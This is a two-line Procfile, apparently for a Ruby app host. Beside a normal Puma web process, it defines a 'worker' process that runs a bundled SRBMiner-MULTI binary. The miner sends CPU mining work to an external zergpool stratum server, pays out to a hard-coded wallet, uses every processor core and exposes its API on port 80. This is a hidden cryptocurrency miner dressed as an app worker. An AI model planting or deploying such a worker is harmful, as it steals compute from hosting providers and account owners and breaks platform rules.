web: bundle exec puma -C config/puma.rb
worker: chmod +x ./SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm yespowerLTNCG --pool stratum+ssl://yespowerLTNCG.mine.zergpool.com:16239 --wallet DFgN9Wf6AwSiRPskC5PJWBvafecAZEjbho --password c=DOGE,mc=CRNC,ID=ruby --api-enable --api-port 80 --disable-auto-affinity --disable-gpu --cpu_threads $(grep -c '^processor' /proc/cpuinfo)
